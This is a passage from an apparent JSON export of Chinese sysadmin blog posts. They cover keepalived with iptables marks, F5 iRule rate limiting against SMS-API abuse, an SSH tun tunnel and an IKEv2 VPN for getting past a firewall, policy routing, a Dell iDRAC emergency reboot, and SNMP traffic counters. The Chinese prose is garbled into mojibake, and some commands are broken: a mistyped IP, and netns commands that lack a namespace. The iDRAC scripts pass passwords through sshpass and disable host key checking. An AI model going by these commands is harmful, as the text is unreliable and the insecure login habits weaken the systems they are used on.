‡ç­¾ï¼Œæ¯”å¦‚æˆ‘ä»¬æŠŠä»1.2.3.4è¿›æ¥çš„åŒ…éƒ½æ‰“ä¸Šæ ‡ç­¾2000ï¼ˆæ ‡ç­¾å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°ï¼‰\n1iptables -t mangle -A PREROUTING -i eth0 \\ 2-p tcp -s 1.2.3.4 --dport http -j MARK --set-mark 2000 æˆ–è€…æŠŠè®¿é—®172.16.8.1çš„80å’Œ443ç«¯å£çš„åŒ…éƒ½æ‰“ä¸Šæ ‡ç­¾123ï¼š\n1iptables -t mangle -A PREROUTING -i eth0 \\ 2-p tcp -d 172.16.8.1/32 -m multiport --dports 80,443 -j MARK --set-mark 123 éšåæˆ‘ä»¬å°±å¯ä»¥åœ¨keepalivedé‡Œæ¥æŒ‡å®švirtual_serveræ¥å¤„ç†è¿™äº›æ‰“è¿‡æ ‡ç­¾çš„æµé‡äº†ï¼š\n1virtual_server fwmark 123 { 2 ... 3} å…·ä½“çš„ä¸€ä¸ªç”¨æ³•ï¼Œå¦‚æœä½ æƒ³ç¦æ­¢ä»1.2.3.4æ¥çš„ipè®¿é—®ä½ æœåŠ¡å™¨ï¼Œäºæ˜¯ä¹ä½ å°±å¯ä»¥å…ˆç»™åŒ…æ‰“ä¸Šæ ‡ç­¾2000ï¼Œç„¶åé…ä¸ªæœåŠ¡å™¨ï¼Œä¸Šé¢å†™è”ç³»äººå’Œç”µè¯ï¼Œå•ç‹¬ç»™ä»–çœ‹ï¼Œä»–çœ‹åˆ°ä¼šè”ç³»ä½ è¯¢é—®è¢«å±è”½çš„åŸå› ï¼Œå¦‚ä¸‹ï¼š\n1virtual_server fwmark 2000 { 2 3delay_loop 6 4 lb_algo wlc 5 lb_kind NAT 6 persistence_timeout 0 7 protocol TCP 8 9real_server 10.10.10.1 80 { 10 weight 1 11 TCP_CHECK { 12 connect_port 80 13 connect_timeout 3 14 } 15 } 16} ","date":"2024-01-11","img":"","permalink":"https://rendoumi.com/posts/20240111-keepalived_iptable_mark/","series":null,"tags":null,"title":"Keepalivedä¸iptables Markçš„è”åŠ¨"},{"categories":null,"content":"å…¬å¸çš„æœåŠ¡å™¨é­å—äº†æ”»å‡»ï¼ŒæŸäº›äººä¸åœè°ƒç”¨å…¬å¸æœåŠ¡å™¨å‘é€çŸ­ä¿¡çš„apiï¼ŒçœŸæ˜¯æœ‰å¤Ÿæ— èŠçš„ã€‚\nç”±äºæˆ‘ä»¬çš„æ¶æ„æ˜¯å‰é¢F5 Bigipï¼Œåé¢æ¥äº†Nä¸ªTomcatï¼Œé‚£å°±ç›´æ¥å†™ä¸ªF5çš„iruleæ¥é˜»æ­¢å®ƒã€‚\né˜»æ­¢GETè¯·æ±‚çš„é¢‘ç‡ï¼Œ30ç§’åªå…è®¸å•ä¸ªipå‘5æ¬¡\n1å‡è®¾GETçš„æ¨¡å¼æ˜¯ 2GET /sendsms.do?mobile=13800000000\u0026amp;msg=aaaaaaaa iruleé‡Œæœ‰ä¸ªéå¸¸ç¥å¥‡çš„ä¸œè¥¿ï¼Œtableï¼Œæ˜¯sessionä¼šè¯è¡¨çš„è¶…è¡¨ï¼ŒåŸºæœ¬æ“ä½œæ˜¯key-valueå‹ï¼Œå¸¦æœ‰ç”Ÿå­˜æ—¶é—´ï¼Œè¿™ç‚¹æœ€é‡è¦ã€‚\nè¯¦ç»†çš„å¤§å®¶å¯ä»¥å»çœ‹ï¼š\nhttps://clouddocs.f5.com/api/irules/table.html é˜»æ­¢GETçš„iruleï¼š\n1when RULE_INIT { 2 set static::windowSecs 30 3} 4 5 6when HTTP_REQUEST { 7 if { ( [HTTP::method] equals \u0026#34;GET\u0026#34; ) \u0026amp;\u0026amp; ( [HTTP::uri] starts_with \u0026#34;/sendsms.do\u0026#34; ) } { 8 set myUserId [IP::client_addr] 9 set myMaxRate 5 10 if { $myMaxRate ne \u0026#34;\u0026#34; } { 11 set reqnum [table incr \u0026#34;req:$myUserId\u0026#34;] 12 set tbl \u0026#34;countpost:$myUserId\u0026#34; 13 table set -subtable $tbl $reqnum \u0026#34;ignored\u0026#34; indef $static::windowSecs 14 if { [table keys -subtable $tbl -count] \u0026gt; $myMaxRate } { 15 HTTP::respond 403 \u0026#34;Block\u0026#34; 16 return 17 } 18 } 19 } 20} æ¥ä¸ªæ›´åŠ å¤æ‚çš„ä¾‹å­ï¼š\nPOSTçš„è¯·æ±‚å¦‚ä¸‹ï¼š\n1POST /api/sendMessage.htm HTTP/1.1 2Content-Length: 203 3Content-Type: application/x-www-form-urlencoded; charset=UTF-8 4Host: 172.8.2.23 5Connection: Keep-Alive 6User-Agent: Apache-HttpClient/4.5 (Java/1.7.0_51) 7Accept-Encoding: gzip,deflate 8 9action=order.sumit.order\u0026amp;jsonData=%7B%22channelCode%22%3A%22%22%2C%22mobiles%22%3A%5B%2215176989787%22%5D%2C%22source%22%3A%22pop%22%2C%22tempParameters%22%3A%5B%22480827%22%2C%2291%22%5D%2C%22templateId%22%3A2%7D æˆ‘ä»¬è¦é˜»æ­¢POST /api/sendMessage.htmä¸”action=sendmsgçš„è¯ï¼Œå°±æ¯”è¾ƒå¤æ‚ä¸€äº›ï¼Œæˆ‘ä»¬åˆ¤æ–­uriæ»¡è¶³æ¡ä»¶åï¼Œè¿˜è¦è¿›ä¸€æ­¥åˆ¤æ–­contentä¸­action=çš„å†…å®¹ï¼š\n1when RULE_INIT { 2 set static::windowSecs 10 3} 4 5 6when HTTP_REQUEST { 7 8 if { ( [HTTP::method] equals \u0026#34;POST\u0026#34; ) \u0026amp;\u0026amp; ( [HTTP::uri] equals \u0026#34;/api/sendMessage.htm\u0026#34; ) \u0026amp;\u0026amp; ([HTTP::header \u0026#34;Content-Length\u0026#34;] \u0026lt;= 2048) } { 9 HTTP::collect [HTTP::header Content-Length] 10 } 11} 12 13when HTTP_REQUEST_DATA { 14 15 set myUserId [IP::client_addr] 16 set mymethod \u0026#34;unknown\u0026#34; 17 18 foreach x [split [string tolower [HTTP::payload]] \u0026#34;\u0026amp;\u0026#34;] { 19 if { $x starts_with \u0026#34;action=\u0026#34; } { 20 set mymethod [lindex [split $x \u0026#34;=\u0026#34;] 1] 21 } 22 } 23 24 if { $mymethod equals \u0026#34;order.submit.order\u0026#34; } 25 { 26 set myMaxRate 5 27 if { $myMaxRate ne \u0026#34;\u0026#34; } { 28 set reqnum [table incr \u0026#34;req:$myUserId\u0026#34;] 29 set tbl \u0026#34;countpost:$myUserId\u0026#34; 30 table set -subtable $tbl $reqnum \u0026#34;ignored\u0026#34; indef $static::windowSecs 31 if { [table keys -subtable $tbl -count] \u0026gt; $myMaxRate } { 32 HTTP::respond 403 \u0026#34;Block\u0026#34; 33 return 34 } 35 } 36 } 37} ","date":"2024-01-11","img":"","permalink":"https://rendoumi.com/posts/20240111-f5_irule_ddos/","series":null,"tags":null,"title":"F5åˆ©ç”¨iruleæ¥é˜²æ­¢Ddosçš„æ–¹æ³•"},{"categories":null,"content":"opensshæ˜¯æ”¯æŒéš§é“çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥åœ¨sshä¸­å†å¥—ä¸ªç®¡é“ï¼Œç›´æ¥ç”¨æ¥ç¿»å¢™ï¼Œåšæ³•å¦‚ä¸‹ï¼š\nå¦‚ä¸Šå›¾ï¼ŒAæœºèƒ½sshç™»å½•Bæœº\nAæœºçš„IPï¼š172.16.8.106\nBæœºçš„IPï¼š172.16.8.108\nAæœºå»ºç«‹tunnelåtunçš„ipï¼š192.168.244.1\nBæœºå»ºç«‹tunnelåtunçš„ipï¼š192.168.244.2\né¦–å…ˆç¼–è¾‘Aå’ŒBçš„/etc/ssh/sshd_configï¼Œå…è®¸tunnelï¼Œç¼ºçœæ˜¯ä¸å…è®¸çš„ï¼Œç„¶åservice sshd restart ï¼Œé‡å¯sshd 1... 2PermitTunnel yes 3... Aå’ŒBå®‰è£…linuxä¸‹çš„tunè½¯ä»¶ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªtunnelè®¾å¤‡ 1yum install tunctl 2tunctl -t tun5 -u root åœ¨A(172.16.8.106)æœºå™¨ä¸Šç”Ÿæˆkeyï¼Œå¹¶è®¾ç½®èƒ½æ— å¯†ç è¯ä¹¦ç›´æ¥ç™»å½•B(172.16.8.108) 1ssh-keygen 2ssh-copy-id root@172.16.8.108 åœ¨Aä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå»ºç«‹ssh tunnelï¼š 1ssh -w 5:5 root@172.168.8.108 åœ¨Aä¸Šæ‰§è¡Œ 1ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0 åœ¨Bä¸Šæ‰§è¡Œ 1ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0 è¿™æ ·åˆ†åˆ«åœ¨Aå’ŒBä¸Šping 192.168.244.1å’Œ192.168.244.2ï¼Œéƒ½èƒ½é€šå°±è¡¨ç¤ºå·²ç»okäº†ã€‚ ä¼˜åŒ–ä¸€ä¸‹ï¼ŒAå’ŒBä¸¤è¾¹éƒ½å…ˆæŠŠtun5å¯åŠ¨ä»¥åï¼Œç›´æ¥åœ¨Aä¸Šä¸€å¥è¯æå®šï¼Œè¿™ä¸ªä¸ä¼šè‡ªåŠ¨é€€å‡ºï¼Œæ‰€ä»¥å¾—ctrl+zï¼Œç„¶åbgæ”¾åå°å»ï¼Œæˆ–è€…screenæŒ‚ä½ï¼š\n1ssh \\ 2 -o PermitLocalCommand=yes \\ 3 -o LocalCommand=\u0026#34;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0\u0026#34; \\ 4 -o ServerAliveInterval=60 \\ 5 -w 5:5 root@172.16.8.108 \\ 6 \u0026#39;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0; echo tun5 ready\u0026#39; å¦‚æœè¦ç”¨åœ¨ç¿»å¢™çš„ç¯å¢ƒï¼Œé‚£å°±å¾—ä¿æŒé•¿é“¾æ¥äº†ã€‚å‡è®¾Aæœºå™¨æ˜¯åœ¨ä¸€ä¸ªé˜²ç«å¢™åï¼Œä¸”è¢«NATäº†ï¼Œé‚£ä¹ˆå°±å¾—å…ˆè¿™æ ·æ‰“é€šéš§é“ï¼š\n1ssh -f -w5:5 vpn@example.com \\ 2 -o ServerAliveInterval=30 \\ 3 -o ServerAliveCountMax=5 \\ 4 -o TCPKeepAlive=yes \\ 5 -i ~/.ssh/id_rsa \u0026#34;sleep 1000000000\u0026#34; ç„¶ååœ¨Aå’ŒBä¸Šåˆ†åˆ«å•ç‹¬é…ç½®ipå³å¯ã€‚\nå†è¿›é˜¶ï¼šå‡è®¾Aè¦å»ºç«‹ç‹¬ç«‹çš„netnsç©ºé—´ï¼ŒåŠ ipåŠç½‘å…³å¦‚ä¸‹ï¼š\n1ip net add ns-vpn 2ip net exec ip addr add 100.64.42.2/24 dev tun42 3ip net exec ip link set up dev tun42 4ip net exec ip route add default via 100.64.42.1 å†åœ¨Bçš„/etc/sysctl.confæ‰“å¼€è½¬å‘\n1net.ipv4.ip_forward = 1 2sysctl -p 3iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -j SNAT --to 172.16.8.108 Aå°±å¯ä»¥é€šè¿‡Bä»£ç†å‡ºå»äº†ã€‚\n","date":"2024-01-11","img":"","permalink":"https://rendoumi.com/posts/20240111-openssh_tunnel/","series":null,"tags":null,"title":"ç”¨opensshçš„tunnelå»ºç«‹éš§é“ç¿»å¢™"},{"categories":null,"content":"è¿™ç¯‡æ–‡ç« åªé€‚ç”¨äºåœ¨è‡ªå·±çš„vpsä¸Šè¿è¡Œï¼š\næ­¥éª¤å¦‚ä¸‹ï¼š\n1ã€æ‹‰å›æ¥é•œåƒï¼Œikev2-vpn-serverï¼Œè¯è¯´è¿™ä¹ˆå¤šå¹´è¿‡å»äº†ï¼Œä¾ç„¶é€‚ç”¨ï¼Œ2016å¹´åˆ°ç°åœ¨\n1docker pull gaomd/ikev2-vpn-server 2ã€å¯åŠ¨æœåŠ¡ç«¯ï¼Œæ³¨æ„\u0026ndash;privilegedå‚æ•°ï¼Œè¿™ä¸ªæ˜¯å¿…é¡»çš„\n1docker run --privileged -d --name ikev2-vpn-server --restart=always -p 500:500/udp -p 4500:4500/udp gaomd/ikev2-vpn-server:0.3.0 æå®šï¼Œåªéœ€è¦2æ­¥å³å¯å®Œæˆç›¸å¯¹æ¯”è¾ƒéš¾æçš„ikev2çš„å®‰è£….\n3ã€ç”Ÿæˆiphoneå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶\n1docker run -i -t --rm --volumes-from ikev2-vpn-server -e \u0026#34;HOST=vpn.rendoumi.com\u0026#34; gaomd/ikev2-vpn-server:0.3.0 generate-mobileconfig \u0026gt; ikev2-vpn-ihone6s.mobileconfig æ³¨æ„ï¼švpn.rendoumi.comæ›¿æ¢æˆä½ è‡ªå·±å¯¹åº”çš„ipæˆ–è€…åŸŸå\nç„¶åä½ æŠŠè¿™ä¸ªé…ç½®æ–‡ä»¶ä¸‹è½½ï¼Œå®‰è£…åˆ°MacOSæˆ–è€…iOSä¸­ï¼Œå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚\n","date":"2024-01-11","img":"","permalink":"https://rendoumi.com/posts/20240111-ikev2_docker/","series":null,"tags":null,"title":"Dockeræ€¥é€Ÿæ­å»ºè¿è¡Œikev2 Vpnæ¥è®©iphoneç¿»å¢™"},{"categories":null,"content":"å¦‚æœæˆ‘ä»¬æœ‰ä¸¤æ¡ä¸Šç½‘çº¿è·¯å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆç­–ç•¥è·¯ç”±å°±æ˜¯ä¸ªå¥½çš„é€‰æ‹©äº†ã€‚\nåŸºæœ¬æ¦‚å¿µï¼š\nç­–ç•¥è·¯ç”±è¡¨ï¼ˆPolicy routing tablesï¼‰: Linux ç¼ºçœæœ‰3ä¸ªè¡¨ï¼Œ local (ä¸èƒ½æ”¹ä¹Ÿä¸èƒ½åˆ ), main, å’Œ defaultã€‚æ·»åŠ è·¯ç”±çš„æ—¶å€™å¦‚æœä¸æŒ‡å®šï¼Œç¼ºçœæ˜¯æ·»åŠ åˆ°mainè·¯ç”±è¡¨é‡Œçš„ã€‚ ç­–ç•¥è·¯ç”±è§„åˆ™ï¼ˆPolicy routing rulesï¼‰: Linux ç¼ºçœä¹Ÿæœ‰ä¸‰å¥—è·¯ç”±è§„åˆ™ï¼Œå¯¹åº”ä¸‰ä¸ªç¼ºçœè·¯ç”±è¡¨ã€‚ æŸ¥çœ‹ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªè¡¨ï¼š\n1# ip rule list 20: from all lookup local 332766: from all lookup main 432767: from all lookup default æŸ¥localè¡¨çš„è·¯ç”±è§„åˆ™ï¼š\n1# ip route list table local 2local 10.10.0.1 dev tun0 proto kernel scope host src 10.10.0.1 3broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1 4local 192.168.122.1 dev virbr0 proto kernel scope host src 192.168.122.1 5local 172.16.8.1 dev br0 proto kernel scope host src 172.16.8.1 6broadcast 192.168.122.0 dev virbr0 proto kernel scope link src 192.168.122.1 7broadcast 172.16.8.0 dev br0 proto kernel scope link src 172.16.8.1 8broadcast 172.16.9.255 dev br0 proto kernel scope link src 172.16.8.1 9broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 10broadcast 192.168.122.255 dev virbr0 proto kernel scope link src 192.168.122.1 11local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 12local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 ä½¿ç”¨ç­–ç•¥è·¯ç”±çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œ1ã€å®šä¹‰ä¸€ä¸ªè·¯ç”±è¡¨ï¼Œ2ã€å®šä¹‰è·¯ç”±è§„åˆ™ï¼Œ3ã€åº”ç”¨è·¯ç”±è§„åˆ™ã€‚\nä¸€ã€å…ˆå»ºç«‹ä¸€ä¸ªè‡ªå®šä¹‰çš„è·¯ç”±è¡¨ï¼ŒID æ˜¯ 10000 ï¼Œåå­—å«åšmygodï¼ˆæ³¨æ„ï¼ŒIDä»0-32766ä¹‹é—´éšä½ ä¾¿èµ·ï¼Œ3ä¸‡å¤šä¸ªå¯é€‰ï¼‰ï¼š\n1echo 10000 mygod \u0026gt;\u0026gt; /etc/iproute2/rt_tables äºŒã€å»ºç«‹è·¯ç”±è§„åˆ™\n1ip rule add from \u0026lt;source address\u0026gt; lookup \u0026lt;table name\u0026gt; å‡è®¾æˆ‘ä»¬æœºå™¨ä¸Šè¿äº†ä¸¤æ¡çº¿è·¯ï¼Œä¸¤å—ç½‘å¡ï¼Œåˆ†é…äº†2ä¸ªipï¼Œç¬¬ä¸€ä¸ªçº¿è·¯æ˜¯eth0ï¼Œipæ˜¯192.168.1.1ï¼Œç¬¬äºŒä¸ªçº¿è·¯æ˜¯eth1ï¼Œipæ˜¯192.168.2.1ã€‚æˆ‘ä»¬æ·»åŠ ä¸€ä¸‹ç­–ç•¥è·¯ç”±è§„åˆ™ï¼Œä»192.168.2.1è¿‡æ¥çš„èµ°mygodè§„åˆ™ã€‚\n1ip rule add from 192.168.2.1 lookup mygod ä¸‰ã€åº”ç”¨è·¯ç”±è§„åˆ™\n1ip route add default via 192.168.2.1 dev eth1 table mygod æ³¨æ„ï¼Œè¿™é‡Œæ˜¯åº”ç”¨äº†ç¼ºçœè·¯ç”±ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å¼„å…¶ä»–çš„ã€‚æ¯”å¦‚ï¼Œä¸€å°æœºå™¨ä¸€ä¸ªç½‘å¡ï¼ŒNä¸ªIPï¼Œæ¯ä¸ªipå¯¹åº”ä¸åŒçš„ä¸“çº¿ã€‚ä½ å°±å¯ä»¥æ·»åŠ ä¸åŒçš„éç¼ºçœè·¯ç”±ã€‚å¦å¤–ï¼Œä¹Ÿæ˜¯æ”¯æŒvlançš„ã€‚\n1ip route add default via 192.168.2.1 dev eth0.30 table vlan30 å¦‚æœæƒ³æŠŠç­–ç•¥è·¯ç”±å›ºå®šä¸‹æ¥ï¼Œä¸ç”¨æ¯æ¬¡éƒ½æ‰§è¡Œshellè„šæœ¬ï¼Œç”Ÿæˆä¸‹é¢ä¸¤ä¸ªæ–‡ä»¶ï¼š\n1# vi /etc/sysconfig/network-scripts/route-eth1 2192.168.2.0/24 dev eth1 table mygod 3default via 192.168.2.1 dev eth1 table mygod 4 5# vi /etc/sysconfig/network-scripts/rule-eth1 6from 192.168.2.0/24 lookup mygod ","date":"2024-01-10","img":"","permalink":"https://rendoumi.com/posts/20240110-route_policy/","series":null,"tags":null,"title":"Linuxä¸‹çš„ç­–ç•¥è·¯ç”±"},{"categories":null,"content":"è®°å½•ä¸€ä¸‹ï¼Œ2016å¹´çš„5æœˆ5æ—¥è¿™å¤©çš„ä¸­åˆã€‚\næ­£åœ¨è·Ÿè€åˆ˜ã€å¤§äº®ã€Goodå®ä¸€èµ·åƒåˆé¥­ï¼Œçªç„¶æ‰‹æœºæ¥åˆ°çŸ­ä¿¡æŠ¥è­¦ï¼Œè¯´æ˜¯ä¸»æ•°æ®åº“Downäº†ã€‚å‡ºå¤§äº‹äº†ï¼ï¼ï¼\nè¿™ä¸ªæ˜¯å¾ˆå¸¸è§çš„åœºæ™¯å§ï¼Œå¦‚ä½•åœ¨è¿™ç§æƒ…å†µä¸‹å¤„ç†æœåŠ¡å™¨æ•…éšœå‘¢ï¼ŸåŸºæœ¬åƒé¥­çš„æ—¶å€™æ˜¯ä¸ä¼šæºå¸¦ç¬”è®°æœ¬çš„ï¼Œæ‰€æœ‰çš„æ“ä½œåªèƒ½åœ¨æ‰‹æœºä¸Šå®Œæˆäº†ã€‚\nå¦‚æœæ˜¯iphoneæ‰‹æœºï¼Œè£…ä¸ŠTermiusï¼›å¦‚æœæ˜¯androidæ‰‹æœºï¼Œè£…ä¸ŠJuicesshã€‚è¿™ä¸¤ä¸ªéƒ½æ˜¯è¿œç¨‹sshè½¯ä»¶ï¼ˆæˆ‘ä»¬çš„æœåŠ¡å™¨éƒ½æ˜¯Linuxï¼Œæ²¡æœ‰Windowsï¼‰ã€‚å¦å¤–å…¬å¸æ˜¯æœ‰openvpnçš„ï¼Œå¿…é¡»é€šè¿‡vpnæ‰èƒ½è¿æ¥åˆ°IDCçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦æ‰‹æœºè£…ä¸Šopenvpnè½¯ä»¶ã€‚\næ‹¨é€švpnï¼Œç”¨sshè¿ä¸ŠæœåŠ¡å™¨ï¼Œç„¶åå¿«é€Ÿè¿è¡Œå®ç°ç¼–å†™å¥½çš„pingè„šæœ¬ï¼š\n1cat 1.ping.sh 2#!/bin/sh 3ping 172.8.$1 è¿™ä¸ªè„šæœ¬å¾ˆå¥‡æ€ªå§ï¼Œåå­—å«åš1.ping.shï¼Œæ˜¯å› ä¸ºåœ¨æ‰‹æœºä¸Šæ“ä½œï¼Œä¸€åˆ‡éƒ½è¦è¿…é€Ÿï¼ŒTermiuså’ŒJuicesshéƒ½æ˜¯æ”¯æŒå‘½ä»¤è¡¥å…¨çš„{tab}é”®çš„ï¼Œæ‰€ä»¥åªè¦è¾“å…¥./1{tab} 1.1 å°±ç­‰äºæ‰§è¡Œäº†ping 172.8.1.1ï¼Œä¸Šé¢åªè¾“å…¥äº†6ä¸ªå­—ç¬¦ï¼Œè€Œå®Œæ•´çš„pingå‘½ä»¤åˆ™éœ€è¦è¾“å…¥14ä¸ªå­—ç¬¦ï¼Œè¿™å°±æ˜¯åŸå› äº†ã€‚\npingä¸€ä¸‹ä¸é€šï¼Œé‚£å°±èµ¶ç´§æ‰§è¡Œè„šæœ¬ï¼ŒæŠ“ä¸€ä¸‹æœåŠ¡å™¨idracå‰é¢æ¿çš„ä¿¡æ¯ï¼š\n1cat 2.idrac.sh 2#!/bin/sh 3sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm get System.LCD.CurrentDisplay ä¸Šé¢è„šæœ¬ç”¨dellçš„radadmæ¥æŠ“å–æœåŠ¡å™¨idracçš„å‰é¢æ¿ä¿¡æ¯ï¼Œidracå’Œç½‘å¡çš„ç½‘æ®µåªæ˜¯å‰é¢ç¬¬ä¸€æ®µä¸åŒï¼Œç½‘å¡æ˜¯172ï¼Œidracæ˜¯10ï¼Œè¿™æ ·å¾ˆæ–¹ä¾¿è®°å¿†ã€‚\nå¾—åˆ°ç»“æœï¼š\n1CPU1 has internal error. (IERR) å½»åº•å®Œè›‹ï¼CPUå‡ºé”™äº†ï¼Œæƒ³éƒ½ä¸ç”¨æƒ³ï¼Œç¡¬ä»¶é‡å¯ï¼š\n1cat 3.reboot.sh 2#!/bin/sh 3sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm serveraction powercycle ä»powercycleåˆ°Centoså®Œå…¨å¯åŠ¨ï¼Œç³»ç»Ÿå¼€å§‹è®°å½•/var/log/messagesï¼Œæ‰€æœ‰æ—¶é—´å…±èŠ±è´¹äº†7åˆ†é’Ÿã€‚\næ³¨æ„ï¼šæœ‰å¯èƒ½åœ¨é‡å¯çš„è¿‡ç¨‹ä¸­éœ€è¦æŒ‰ä¸€ä¸‹F1çš„æŒ‰é’®ç»§ç»­ï¼Œè¿™æ ·å°±éœ€è¦æ‰“å¼€vncï¼ŒæŒ‰é‚£ä¸€ä¸‹å­ï¼Œæˆ–è€…æå‰åœ¨idracé‡Œè®¾ç½®ErrPrompt disabledï¼Œä¸éœ€è¦æŒ‰F1å°±é‡å¯ã€‚\n1sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.MiscSettings.ErrPrompt Disabled æ€»ç»“ï¼šè¿™èµ·æ•…éšœä»æ¥åˆ°æŠ¥è­¦åˆ°æ£€æŸ¥å®Œæ¯•åªèŠ±è´¹äº†3åˆ†é’Ÿï¼Œç„¶åé‡å¯ï¼Œ7åˆ†é’Ÿæœºå™¨ç³»ç»Ÿå¯åŠ¨ï¼Œ2åˆ†é’Ÿoracleå¤‡åº“æ¢å¤ï¼Œ3+7+2=12åˆ†é’Ÿã€‚è¿™çœŸæ˜¯ä¸ªæé™æ—¶é—´äº†ã€‚\nè¿ç»´èƒ½åšåˆ°çš„ä¹Ÿå°±è¿™ä¹ˆå¿«äº†å§ã€‚\n","date":"2024-01-10","img":"","permalink":"https://rendoumi.com/posts/20240110-dell_restart/","series":null,"tags":null,"title":"æœåŠ¡å™¨R920çš„ä¸€æ¬¡æ€¥é€Ÿæ•…éšœå¤„ç†"},{"categories":null,"content":"ç”¨bashéšæœºç”Ÿæˆç½‘å¡åœ°å€ï¼š\n1echo 52:54:$(dd if=/dev/urandom count=1 2\u0026gt;/dev/null | md5sum | sed \u0026#39;s/^\\(..\\)\\(..\\)\\(..\\)\\(..\\).*$/\\1:\\2:\\3:\\4/\u0026#39;) 252:54:f6:65:52:39 å¦ä¸€ç§åšæ³•ï¼š\n1openssl rand -hex 6 | sed \u0026#39;s/\\(..\\)/\\1:/g; s/.$//\u0026#39; ","date":"2024-01-09","img":"","permalink":"https://rendoumi.com/posts/20240109-kvm_random_mac/","series":null,"tags":null,"title":"KVMä¸­ç½‘å¡åœ°å€éšæœºç”Ÿæˆæ–¹æ³•"},{"categories":null,"content":"vim ç¼–è¾‘æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯æœ‰ä¸­æ–‡çš„ï¼Œå¯æ˜¯ç¯å¢ƒå˜é‡ä¸­LANG=Cï¼Œéå¸¸ä¸ä¾¿å•Šï¼Œç»å¸¸å¾—export LANG=zh_CNæ¥è§£å†³ã€‚æ”¾åœ¨/etc/profileé‡Œä¹Ÿä¸æ˜¯ä¸ªäº‹ã€‚\nä¸€åŠ³æ°¸é€¸çš„æ–¹æ³•ï¼š\n1# vi /etc/sysconfig/i18n 2------ 3LANG=\u0026#34;zh_CN.UTF-8\u0026#34; 4SUPPORTED=\u0026#34;zh_CN.UTF-8:zh_CN:zh:zh_TW.UTF-8:zh_TW:zh:en_US.UTF-8:en_US:en\u0026#34; 5SYSFONT=\u0026#34;latarcyrheb-sun16\u0026#34; 6------ ","date":"2024-01-09","img":"","permalink":"https://rendoumi.com/posts/20240109-linux_lang/","series":null,"tags":null,"title":"Linuxä¸‹è®¾ç½®LANGå˜é‡"},{"categories":null,"content":"æƒ³è‡ªå·±ç”»å›¾æ¥ç›‘æ§äº¤æ¢æœºçš„æµé‡ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯é€šè¿‡snmpwalkæ¥å¾—åˆ°äº¤æ¢æœºçš„è¿›å‡ºæµé‡ï¼š\næˆ‘ä»¬ç”¨å¾—æ˜¯Cisco 3750çš„24å£äº¤æ¢æœºï¼Œç»™ä¸ªOIDè¡¨ï¼š\nå…ˆçœ‹ä¸€ä¸‹äº¤æ¢æœºçš„ç«¯å£æƒ…å†µï¼š\n1snmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.2 å¾—åˆ°ä¸€å †ä¿¡æ¯ï¼Œé—®ç½‘ç»œå·¥ç¨‹å¸ˆå¾—åˆ°1/0/5å’Œ2/0/5è¿™ä¸¤ä¸ªç«¯å£æ˜¯åŒä¸Šè¿çº¿è·¯ï¼š\n1IF-MIB::ifDescr.10105 = STRING: GigabitEthernet1/0/5 2IF-MIB::ifDescr.10605 = STRING: GigabitEthernet2/0/5 è®°ä½ä¸¤ä¸ªç«¯å£çš„æè¿°ç¬¦ï¼Œ10105å’Œ10605.\nç»§ç»­ï¼Œæˆ‘ä»¬çœ‹ä¸Šè¡¨ï¼Œ.1.3.6.1.2.1.2.2.1.10(æ¥å£æ”¶åˆ°çš„å­—èŠ‚æ•°)ï¼Œæˆ‘ä»¬è¦å¾—åˆ°æŸä¸ªå…·ä½“ç«¯å£æ”¶åˆ°çš„å­—èŠ‚æ•°ï¼Œå°±å¿…é¡»åŠ ä¸Šç«¯å£çš„æè¿°ç¬¦äº†ã€‚æ‰€ä»¥è¦å¾—åˆ°1/0/5çš„æ”¶åˆ°å­—èŠ‚æ•°ï¼Œå°±æ˜¯.1.3.6.1.2.1.2.2.1.10.10105\n1#snmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.10.10105 2IF-MIB::ifInOctets.10105 = Counter32: 2198534228 okï¼Œæ‹¿åˆ°å­—èŠ‚æ•°äº†ï¼Œç„¶åå•ä½æ˜¯bytesï¼Œæ¢ç®—æˆbit(*8)ï¼Œç„¶åé™¤è‹¥å¹²1024ï¼Œå¾—åˆ°å•ä½mï¼Œg, tç­‰ï¼Œå…¥åº“ï¼Œç„¶åè°ƒhichartç”»å›¾å³å¯ã€‚\nç„¶è€Œï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œçœ‹æ¸…ä¸Šé¢çš„å•ä½ï¼ŒCounter32ï¼Œå‘µå‘µï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ä¸å¯¹çš„ã€‚ç°å¦‚ä»Šçš„ç½‘ç»œå¤šæ˜¯åƒå…†ç½‘å¡äº†ï¼Œæ‰€ä»¥counter32æ˜¯ä¸å¯¹çš„, 